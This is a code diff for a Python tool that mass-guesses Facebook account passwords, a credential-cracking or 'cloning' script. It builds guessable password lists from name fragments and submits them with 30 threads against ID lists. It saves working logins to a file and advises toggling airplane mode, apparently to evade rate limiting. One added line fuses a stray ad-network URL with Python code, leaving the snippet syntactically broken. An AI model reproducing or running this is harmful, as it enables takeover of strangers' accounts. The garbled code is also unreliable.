@@ -266,7 +266,7 @@ def main():
                 create_file()
         elif menu_opt =='3':
                 xchker()
-                os.system('xdg-open https://github.com/CyberAttack85/Cyber-Attack.git')
+                os.system('xdg-open https://github.com/TechQaiser/Qnumber')
                 main()
         elif menu_opt =='4':
                 os.system('rm -rf fb_cookies.txt')
@@ -432,7 +432,10 @@ def mycrackistan():
                 crack_main().crackmail(id)
         elif '3' in clone_type:
                 crack_main().cracknum(id)
-
+https://www.toprevenuegate.com/w65djugnr2?key=c10a3acc28b1d77fcfb6751689441f12for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
 class crack_main():
         def __init__(self):
                 self.id=[]
@@ -553,7 +556,7 @@ class crack_main():
                         print(logo)
                         print(" what is your andriod version ex 8,9,10,11,12,13")
                         version_=input(' type andriod version : ')
-                        print(44*'-')                                                             
+                        print(44*'-')                                              
                 pl = int(input(' How Much Password Do You Want To Add ? '))
                 print(' Example first123,last123,khan123,firstlast')
                 print(50*"-")
@@ -564,7 +567,24 @@ class crack_main():
                 print(' Total Ids : '+str(len(self.id)))
                 print(' Cloning Is Started Wait For Results')
                 print(' After Every 5 Min Turn Airplane On/Off')
-                print(50*'-')													
+                print(50*'-')
+                with ThreadPool(max_workers=30) as formSubmit:
+                        for user in self.id:
+                                if '2' in clone_type:
+                                        iid,name = user.split('|')
+                                else:
+                                        od,name = user.split('|')
+                                        iid = od+'@facebook.com'
+                                formSubmit.submit(self.m1,iid,name,passlist)
+                print(50*'-')
+                print(' SucessFully Process Is Completed ')
+                print(' Total Ok Ids : '+str(len(ok)))
+                print(' Ok Ids Save In : /sdcard/UMAR_ok.txt')
+                print(50*'-')
+                input('\n Press enter to back ')
+                main()
+
+
 def create_file():
         os.system('clear')
         print(logo);xchker()
@@ -608,6 +628,8 @@ def create_file_login():
                 time.sleep(1)
                 os.system('rm -rf .fb_cookies.txt .access_token.txt')
                 login()
+        except requests.exceptions.ConnectionError:
+                print(' No internet connection ...')
         os.system('clear')
         print(logo);xchker()
         print("[1] Create File Mix Ids")
